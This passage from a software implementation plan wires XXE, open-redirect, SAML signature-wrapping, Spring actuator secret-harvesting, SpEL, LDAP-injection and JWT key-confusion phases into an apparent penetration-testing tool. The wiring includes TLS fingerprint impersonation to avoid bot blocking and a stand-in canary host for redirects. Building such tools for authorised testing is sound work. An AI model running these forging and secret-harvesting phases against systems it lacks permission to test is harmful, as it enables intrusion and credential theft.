# tests/test_hunt_new_phase_wiring.py
"""Verifies the new phases are correctly registered in hunt.py's dashboard
tracking dicts — a phase with only an appended run_*() function but no
_phase_tool_map/_phase_requested entry silently misreports its dashboard
status (confirmed in codex/grok's design review)."""
import hunt


def test_new_phase_functions_exist():
    for name in ("run_xxe_hunt", "run_open_redirect_hunt", "run_saml_xsw",
                 "run_actuator_probe", "run_ldap_injection"):
        assert hasattr(hunt, name), f"hunt.py is missing {name}"


def test_new_phases_registered_in_phase_requested_source():
    import inspect
    source = inspect.getsource(hunt.run_autonomous_hunt)
    for key in ("xxe_hunt", "open_redirect_hunt", "saml_xsw", "actuator_probe", "ldap_injection"):
        assert f'"{key}"' in source, f"_phase_requested/_phase_tool_map missing entry for {key}"


def test_run_jwt_audit_source_calls_kid_injection_module():
    import inspect
    source = inspect.getsource(hunt.run_jwt_audit)
    assert "jwt_kid_injection" in source
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_hunt_new_phase_wiring.py -v`
Expected: FAIL — `hunt` module has no attribute `run_xxe_hunt`

- [ ] **Step 3: Write the integration edits**

Add near the end of `hunt.py`, after the existing `run_jwt_audit()` function (~line 7810), five new phase functions following the existing `_brain_phase_complete()` convention:

```python
def run_xxe_hunt(domain: str) -> bool:
    """XXE probing (content-type swap + upload vector + blind OOB)."""
    import xxe_hunt
    import tls_impersonation
    import interactsh_client

    log("phase", f"XXE HUNT: {domain}")
    findings_dir = _resolve_findings_dir(domain, create=True)
    xxe_dir = os.path.join(findings_dir, "xxe")
    os.makedirs(xxe_dir, exist_ok=True)

    urls_file = os.path.join(_resolve_recon_dir(domain), "urls", "with_params.txt")
    if not os.path.isfile(urls_file):
        _brain_phase_complete("XXE HUNT", False, detail=f"target={domain} no urls with params")
        return False

    client = tls_impersonation.get_client(fingerprint=tls_impersonation.select_fingerprint(domain))
    session = interactsh_client.spawn(log_dir=xxe_dir)

    confirmed, candidates = 0, 0
    for url in _collect_urls_from_file(urls_file, strip_query=False, limit=100):
        result = xxe_hunt.probe_content_type_swap(client, url, {})
        line_out = os.path.join(xxe_dir, "findings.txt")
        if result.verdict == "confirmed":
            confirmed += 1
            with open(line_out, "a") as f:
                f.write(f"[XXE-CONFIRMED] {url} | {result.evidence}\n")
        elif result.verdict == "candidate":
            candidates += 1
            with open(line_out, "a") as f:
                f.write(f"[XXE-CANDIDATE] {url} | {result.evidence}\n")

    if session is not None:
        session.stop()

    _brain_phase_complete("XXE HUNT", True,
                           detail=f"target={domain} confirmed={confirmed} candidates={candidates}",
                           artifacts={"xxe": xxe_dir})
    return True


def run_open_redirect_hunt(domain: str) -> bool:
    """Generic parametric open-redirect fuzzing."""
    import open_redirect_hunt
    import tls_impersonation

    log("phase", f"OPEN REDIRECT HUNT: {domain}")
    findings_dir = _resolve_findings_dir(domain, create=True)
    redirects_dir = os.path.join(findings_dir, "redirects")
    os.makedirs(redirects_dir, exist_ok=True)

    urls_file = os.path.join(_resolve_recon_dir(domain), "urls", "with_params.txt")
    if not os.path.isfile(urls_file):
        _brain_phase_complete("OPEN REDIRECT HUNT", False, detail=f"target={domain} no urls with params")
        return False

    client = tls_impersonation.get_client(fingerprint=tls_impersonation.select_fingerprint(domain))
    attacker_host = os.environ.get("VAPT_REDIRECT_CANARY_HOST", "burpcollaborator.example")

    confirmed = 0
    out_path = os.path.join(redirects_dir, "findings.txt")
    for url in _collect_urls_from_file(urls_file, strip_query=False, limit=200):
        for param in open_redirect_hunt.extract_redirect_params(url):
            result = open_redirect_hunt.probe_url(client, url, param, attacker_host)
            if result.confirmed:
                confirmed += 1
                with open(out_path, "a") as f:
                    f.write(f"[OPEN-REDIRECT-CONFIRMED] {url} | param={param} | location={result.location}\n")

    _brain_phase_complete("OPEN REDIRECT HUNT", True,
                           detail=f"target={domain} confirmed={confirmed}",
                           artifacts={"redirects": redirects_dir})
    return True


def run_saml_xsw(domain: str) -> bool:
    """SAML XSW1-8 forgery — requires an operator-supplied captured SAMLResponse."""
    import saml_xsw_tester
    import tls_impersonation

    log("phase", f"SAML XSW: {domain}")
    findings_dir = _resolve_findings_dir(domain, create=True)
    saml_dir = os.path.join(findings_dir, "saml")
    endpoints_file = os.path.join(saml_dir, "endpoints.txt")
    if not os.path.isfile(endpoints_file):
        _brain_phase_complete("SAML XSW", False, detail=f"target={domain} Check 7 has not run yet")
        return False

    captured_path = os.environ.get("VAPT_SAML_CAPTURED_RESPONSE", "")
    assertion_xml = saml_xsw_tester.load_captured_assertion(captured_path) if captured_path else None
    if assertion_xml is None:
        log("info", "SAML XSW: no captured SAMLResponse supplied (VAPT_SAML_CAPTURED_RESPONSE) — "
                     "skipping forgery, manual capture required")
        _brain_phase_complete("SAML XSW", True, detail=f"target={domain} skipped: no captured assertion")
        return True

    client = tls_impersonation.get_client(fingerprint="chrome124")
    acs_url = open(endpoints_file).read().split()[1] if os.path.getsize(endpoints_file) else ""
    resource_url = os.environ.get("VAPT_SAML_PROTECTED_RESOURCE", "")

    confirmed_variants = []
    for name, xml in saml_xsw_tester.generate_xsw_variants(assertion_xml).items():
        import base64
        forged_b64 = base64.b64encode(xml.encode()).decode()
        result = saml_xsw_tester.confirm_new_session(client, acs_url, forged_b64, resource_url)
        if result.confirmed:
            confirmed_variants.append(name)

    out_path = os.path.join(saml_dir, "xsw_findings.txt")
    with open(out_path, "a") as f:
        for name in confirmed_variants:
            f.write(f"[SAML-XSW-CONFIRMED] variant={name}\n")

    _brain_phase_complete("SAML XSW", True,
                           detail=f"target={domain} confirmed_variants={confirmed_variants}",
                           artifacts={"saml": saml_dir})
    return True


def run_actuator_probe(domain: str) -> bool:
    """SpEL oracle + Jolokia reachability + actuator/env secret parsing."""
    import springboot_actuator_probe
    import tls_impersonation

    log("phase", f"ACTUATOR PROBE: {domain}")
    findings_dir = _resolve_findings_dir(domain, create=True)
    exposure_file = os.path.join(_resolve_recon_dir(domain), "urls", "sensitive_paths.txt")
    if not os.path.isfile(exposure_file):
        _brain_phase_complete("ACTUATOR PROBE", False, detail=f"target={domain} no recon.sh Phase 9 output")
        return False

    client = tls_impersonation.get_client(fingerprint="chrome124")
    actuator_urls = [line.strip() for line in open(exposure_file) if "actuator" in line or "jolokia" in line]

    out_dir = os.path.join(findings_dir, "actuator")
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, "findings.txt")
    confirmed = candidates = 0

    for url in actuator_urls:
        if "env" in url:
            resp = client.get(url)
            try:
                secrets = springboot_actuator_probe.parse_actuator_env_secrets(resp.json())
            except Exception:
                secrets = []
            for hit in secrets:
                confirmed += 1
                with open(out_path, "a") as f:
                    f.write(f"[ACTUATOR-ENV-SECRET-CONFIRMED] {url} | {hit}\n")
        spel_result = springboot_actuator_probe.check_spel_injection(client, url)
        if spel_result.verdict == "confirmed":
            confirmed += 1
            with open(out_path, "a") as f:
                f.write(f"[SPEL-CONFIRMED] {url} | {spel_result.detail}\n")
        elif spel_result.verdict == "candidate":
            candidates += 1
            with open(out_path, "a") as f:
                f.write(f"[SPEL-CANDIDATE] {url} | {spel_result.detail}\n")

    _brain_phase_complete("ACTUATOR PROBE", True,
                           detail=f"target={domain} confirmed={confirmed} candidates={candidates}",
                           artifacts={"actuator": out_dir})
    return True


def run_ldap_injection(domain: str) -> bool:
    """RFC 4515 fuzz + blind oracle — gated on stack fingerprint."""
    import ldap_injection_tester
    import tls_impersonation
    import cve as cve_module  # cve.py::detect_technologies is the existing, real
                               # tech-fingerprint source (parses httpx_full.txt's
                               # tech-detect bracket field + attack_surface.json
                               # tech_clusters) — there is no separate fingerprint-
                               # tag helper in hunt.py itself.

    log("phase", f"LDAP INJECTION: {domain}")
    recon_dir = _resolve_recon_dir(domain)
    techs = cve_module.detect_technologies(domain, recon_dir=recon_dir)
    fingerprint_tags = {name.lower() for name in techs.keys()}
    if not ldap_injection_tester.looks_like_ldap_backed_auth(fingerprint_tags):
        log("info", "LDAP injection: stack fingerprint does not suggest LDAP-backed auth — skipping")
        return True

    findings_dir = _resolve_findings_dir(domain, create=True)
    ldap_dir = os.path.join(findings_dir, "ldap")
    os.makedirs(ldap_dir, exist_ok=True)

    # There is no dedicated login-form recon file (login-path detection today
    # only happens in-process inside vikramaditya.py's fingerprint_webapp, not
    # persisted for hunt.py to read) — filter the real urls/all.txt crawl output
    # for login-shaped paths instead, same approach _authz_select_pages already
    # uses for its own path filtering.
    all_urls_file = os.path.join(_resolve_recon_dir(domain), "urls", "all.txt")
    if not os.path.isfile(all_urls_file):
        _brain_phase_complete("LDAP INJECTION", False, detail=f"target={domain} no urls/all.txt from recon")
        return False

    _LOGIN_PATH_MARKERS = ("login", "signin", "sign-in", "sso", "auth")
    login_urls = [
        u for u in _collect_urls_from_file(all_urls_file, strip_query=False, limit=2000)
        if any(marker in u.lower() for marker in _LOGIN_PATH_MARKERS)
    ][:20]

    client = tls_impersonation.get_client(fingerprint="chrome124")
    confirmed = 0
    out_path = os.path.join(ldap_dir, "findings.txt")
    for url in login_urls:
        baseline = client.get(url, params={"q": "baseline_probe_value"})
        result = ldap_injection_tester.run_blind_oracle(client, url, "q", baseline)
        if result.confirmed:
            confirmed += 1
            with open(out_path, "a") as f:
                f.write(f"[LDAP-INJECTION-CONFIRMED] {url} | {result.detail}\n")

    _brain_phase_complete("LDAP INJECTION", True,
                           detail=f"target={domain} confirmed={confirmed}",
                           artifacts={"ldap": ldap_dir})
    return True
```

Extend the existing `run_jwt_audit()` function: inside the `for i, (token, source) in enumerate(...)` loop, immediately after the existing `## RS256→HS256 confusion` block (after the `results.append(f"## RS256→HS256 confusion\n{out3}\n")` line), insert:

```python
        # jwt_kid_injection: real JWKS-sourced key confusion + kid injection +
        # live-replay confirmation (extends the jwt_tool-only coverage above).
        import jwt_kid_injection
        import tls_impersonation
        jwt_client = tls_impersonation.get_client(fingerprint="chrome124")
        issuer_guess = f"https://{domain}"
        jwks_keys = jwt_kid_injection.discover_jwks(jwt_client, issuer_guess)
        if jwks_keys:
            forged = jwt_kid_injection.try_rs256_to_hs256(token, jwks_keys)
            if forged:
                results.append(f"## JWKS-sourced RS256->HS256 forged token\n{forged}\n")
                log("info", f"JWT {i+1}: JWKS-sourced HS256-confusion token forged — replay against a live endpoint to confirm")
        kid_candidates = jwt_kid_injection.build_kid_injection_candidates(token)
        if kid_candidates:
            results.append(f"## kid-header injection candidates\n{kid_candidates}\n")
```

- [ ] **Step 4: Add dashboard registration** — in `run_autonomous_hunt()`, extend the existing `_phase_tool_map` dict literal with:

```python
        "xxe_hunt":          set(),
        "open_redirect_hunt": set(),
        "saml_xsw":          set(),
        "actuator_probe":    set(),
        "ldap_injection":    set(),
```

and the existing `_phase_requested` dict literal with:

```python
        "xxe_hunt":          should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "xxe_hunt"),
        "open_redirect_hunt": should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "open_redirect_hunt"),
        "saml_xsw":          should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "saml_xsw"),
        "actuator_probe":    should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "actuator_probe"),
        "ldap_injection":    should_run_vuln_scan and not skip_scan and not skip_has(skip_items, "ldap_injection"),
```

Then call each new `run_*()` function from the same place in `run_autonomous_hunt()`'s sequential phase list where `run_jwt_audit()` is currently called, guarded by the corresponding `_phase_requested[...]` flag, matching the exact pattern already used for `nomore403`/`nuclei_dast`.

- [ ] **Step 5: Run test to verify it passes**

Run: `python3 -m pytest tests/test_hunt_new_phase_wiring.py -v`
Expected: PASS (3 tests)

- [ ] **Step 6: Commit**

```bash
git add hunt.py tests/test_hunt_new_phase_wiring.py
git commit -m "feat(hunt): wire xxe/redirect/saml/actuator/ldap phases + jwt_kid_injection extension"
```

---

### Task 10: Integration part B — `reporter.py` wiring

**Files:**
- Modify: `reporter.py`
- Test: `tests/test_reporter_new_prefixes_and_subdirs.py`

**Interfaces:**
- Consumes: the `[X-CANDIDATE]` prefixes emitted by Tasks 3-8, the `findings/redirects/` and `findings/xxe/` directories

- [ ] **Step 1: Write the failing test**

```python
# tests/test_reporter_new_prefixes_and_subdirs.py
"""Verifies the new candidate prefixes are suppressed (not auto-shipped as
findings) and the new subdirs (redirects, xxe) are mapped to a real vtype —
both were confirmed-missing in codex/grok's design review (findings would
otherwise silently drop or unsuppress)."""
import reporter


def test_new_candidate_prefixes_are_non_finding():
    import inspect
    source = inspect.getsource(reporter)
    for prefix in ("[XXE-CANDIDATE]", "[SPEL-CANDIDATE]", "[WAF-BLOCK-DETECTED]"):
        assert prefix in source, f"{prefix} missing from reporter.py NON_FINDING_PREFIXES"


def test_redirects_subdir_is_mapped():
    assert reporter.SUBDIR_VTYPE.get("redirects") == "open_redirect"


def test_xxe_subdir_is_mapped():
    assert "xxe" in reporter.SUBDIR_VTYPE
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_reporter_new_prefixes_and_subdirs.py -v`
Expected: FAIL — `AssertionError` on the `SUBDIR_VTYPE.get("redirects")` check

- [ ] **Step 3: Write the integration edits**

In `reporter.py`, add to the `NON_FINDING_PREFIXES` tuple (after the existing `"[403-BYPASS-CANDIDATE]",` entry), matching the existing rationale-comment style:

```python
            "[XXE-CANDIDATE]",           # xxe/ — parser touched the payload (500 + XML error
                                         # marker) but no in-band file content or OOB callback
                                         # proven. A manual-followup LEAD, not a confirmed XXE.
            "[SPEL-CANDIDATE]",          # actuator/ — arithmetic-only SpEL evaluation proven, no
                                         # system-metadata read confirmed. Reads as theoretical
                                         # until a benign java.version leak also succeeds.
            "[WAF-BLOCK-DETECTED]",      # misconfig/ — tls_impersonation.py's bot-management
                                         # detection lead. A blocked scan is NOT a client
                                         # misconfiguration; this is a coverage/visibility signal
                                         # for the operator, never a finding on its own.
```

In `reporter.py`'s `SUBDIR_VTYPE` dict, add (after the existing `"smuggling": "smuggling",` entry):

```python
    "redirects": "open_redirect",    # open_redirect_hunt.py — was mkdir'd by scanner.sh with
                                      # zero probing logic; now populated by the new hunt.py phase.
    "xxe": "xxe",                    # xxe_hunt.py — new finding category.
    "actuator": "misconfig",         # springboot_actuator_probe.py
    "saml_xsw": "auth_bypass",       # saml_xsw_tester.py forged-session confirmations
    "ldap": "auth_bypass",           # ldap_injection_tester.py
```

Check whether `VULN_TEMPLATES` (search for the dict literal near `SUBDIR_VTYPE`) has an `"xxe"` entry; if not, add one modeled on the existing `"ssrf"` or `"lfi"` entry's shape (same fields: title, description, cvss, remediation).

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_reporter_new_prefixes_and_subdirs.py -v`
Expected: PASS (3 tests)

- [ ] **Step 5: Commit**

```bash
git add reporter.py tests/test_reporter_new_prefixes_and_subdirs.py
git commit -m "feat(reporter): register new candidate prefixes and subdir mappings"
```

---

### Task 11: Integration part C — `requirements.txt` + coverage-gate test

**Files:**
- Modify: `requirements.txt`
- Modify: `tests/test_reporter_subdir_coverage.py` (or equivalent coverage-gate test file — locate via `grep -rl "SUBDIR_VTYPE\|known.*subdir" tests/`)

- [ ] **Step 1: Write the failing test** (extend the existing coverage-gate test rather than create a new one)

Add to the existing subdir-coverage test file:

```python
def test_redirects_and_xxe_subdirs_are_covered():
    import reporter
    for subdir in ("redirects", "xxe", "actuator", "saml_xsw", "ldap"):
        assert subdir in reporter.SUBDIR_VTYPE, f"{subdir} missing from coverage"
```

- [ ] **Step 2: Run test to verify it fails or passes** (it should already PASS if Task 10 landed correctly — this step is a regression guard, not new behavior)

Run: `python3 -m pytest tests/test_reporter_subdir_coverage.py -v`
Expected: PASS (confirms Task 10's `SUBDIR_VTYPE` additions are complete)

- [ ] **Step 3: Update `requirements.txt`**

Add after the existing `certifi>=2024.7.4` line, matching the existing comment style:

```
# ── recon-skills adoption batch 1 (TLS/HTTP2 fingerprint impersonation, XXE,
#    SAML XSW, JWT JWKS, actuator, LDAP injection) ──────────────────────────
curl_cffi>=0.7.0    # graceful-degrades to stock httpx if the native wheel is unavailable
lxml>=5.0.0
PyJWT>=2.12.0
cryptography>=42.0.0    # jwt_kid_injection.py: derives a real RSA public-key PEM from a
                        # JWKS JWK (via jwt.algorithms.RSAAlgorithm.from_jwk) for the
                        # RS256->HS256 confusion HMAC secret — must be the actual key
                        # bytes a real verifier holds, not the JWK's raw encoded text.
ldap3>=2.9.1
h2>=4.1.0
```

- [ ] **Step 4: Verify a clean install works**

Run: `pip3 install --quiet -r requirements.txt && python3 -c "import curl_cffi, lxml, jwt, ldap3, h2; print('all new deps import cleanly')"`
Expected: prints `all new deps import cleanly`

- [ ] **Step 5: Commit**

```bash
git add requirements.txt tests/test_reporter_subdir_coverage.py
git commit -m "chore(deps): formalize curl_cffi/lxml/PyJWT/ldap3/h2 in requirements.txt"
```

---

### Task 12: Full suite run + friends review + finalize

**Files:** none (verification + review task)

- [ ] **Step 1: Run the full test suite**

Run: `python3 -m pytest tests/ -x -q`
Expected: all tests PASS (existing suite + all new tests from Tasks 1-11)

- [ ] **Step 2: Fix any regressions** the full-suite run surfaces (re-run Step 1 until clean)

- [ ] **Step 3: Stage a friends-review briefing inside the repo**

```bash
mkdir -p .friends_recon_skills_batch1
git diff main...HEAD --stat > .friends_recon_skills_batch1/diffstat.txt
cat > .friends_recon_skills_batch1/brief.md << 'EOF'
Review the complete recon-skills-adoption-batch1 diff (branch vs main) for:
1. Correctness bugs in the 7 new modules + interactsh_client.py helper
2. Any FP-guardrail regression vs the approved design (docs/superpowers/specs/2026-07-06-recon-skills-adoption-design.md)
3. Any reporter.py/hunt.py integration gap (missing prefix registration, missing
   phase dashboard entry, missing SUBDIR_VTYPE mapping)
4. Anti-fabrication compliance: does every [X-CANDIDATE] emission actually route
   through NON_FINDING_PREFIXES, and does every "confirmed" verdict require the
   proof tier the design specifies (in-band/OOB for XXE, system-metadata for SpEL,
   3-way baseline diff for JWT replay, protected-resource fetch for SAML XSW,
   3x-repeat for LDAP)?
Read the design doc and the actual diff — do not rely on this summary alone.
EOF
FRIENDS_TIMEOUT=600 friends "Read .friends_recon_skills_batch1/brief.md in this repo (cwd) and the actual git diff (git diff main...HEAD), then answer all 4 questions with a direct adversarial review. Do not summarize the brief back to me." > .friends_recon_skills_batch1/review.txt 2>&1
```

Run this in the background (`run_in_background: true` if launched via the Bash tool), then read `.friends_recon_skills_batch1/review.txt` once complete.

- [ ] **Step 4: Verify every reported finding against live code** before fixing anything (standing rule — friends over-claim, verify first). Fix confirmed real findings in a dedicated follow-up commit.

- [ ] **Step 5: Clean up the review scratch directory and commit the fixes**

```bash
rm -rf .friends_recon_skills_batch1
git add -A
git commit -m "fix(recon-skills-batch1): address friends review findings"
```

- [ ] **Step 6: Hand off to `superpowers:finishing-a-development-branch`** to decide merge/PR — do not push or merge without the user's explicit go-ahead.

---

## Self-Review Notes

- **Spec coverage:** every module in the design doc's Architecture table (tls_impersonation, xxe_hunt, open_redirect_hunt, saml_xsw_tester, jwt_kid_injection, springboot_actuator_probe, ldap_injection_tester) has a task; the design's Integration Plan steps 1-4 map to Tasks 9-11; the design's Testing plan maps to Task 12. `smuggling_hunt.py` is intentionally absent (cut from scope, documented in the design doc and restated in Global Constraints here).
- **Type/interface consistency checked:** `tls_impersonation.get_client()`'s returned object's `.get`/`.post` signature is used identically across Tasks 3-8's tests (`client.get(url, **kwargs)` / `client.post(url, **kwargs)` returning `.status_code`/`.headers`/`.text`/`.json()`). `XxeResult`/`RedirectResult`/`XswResult`/`ReplayResult`/`SpelResult`/`JolokiaResult`/`OracleResult` dataclass field names are used consistently between each module's implementation and its test file, and between each module and its Task 9 `hunt.py` wiring call site.
- **No placeholders:** every step above contains complete, real code — no `TBD`/`TODO`/"add appropriate handling" language.
- **Verified against live code, fixed 3 fabricated references caught during self-review:** Task 9's original draft invented `_load_tech_fingerprint_tags()` (doesn't exist — replaced with the real `cve.py::detect_technologies(domain, recon_dir)`, which returns a `{tech_name: count}` dict parsed from `httpx_full.txt`'s tech-detect field), read from `live/sensitive_paths.txt` (wrong directory — recon.sh actually writes `urls/sensitive_paths.txt`), and read from a nonexistent `urls/login_forms.txt` (login-path detection today only happens in-process inside `vikramaditya.py`'s `fingerprint_webapp` and isn't persisted for `hunt.py` to read — replaced with a real filter over `urls/all.txt` for login-shaped path markers). **Because `hunt.py`/`vikramaditya.py`/`cve.py` are large and change over time, the Task 9 implementer must re-verify every referenced function/file path against the CURRENT code before wiring — do not trust this plan's file/line references blindly, the same way this plan itself did not trust the design doc's assumptions blindly.**
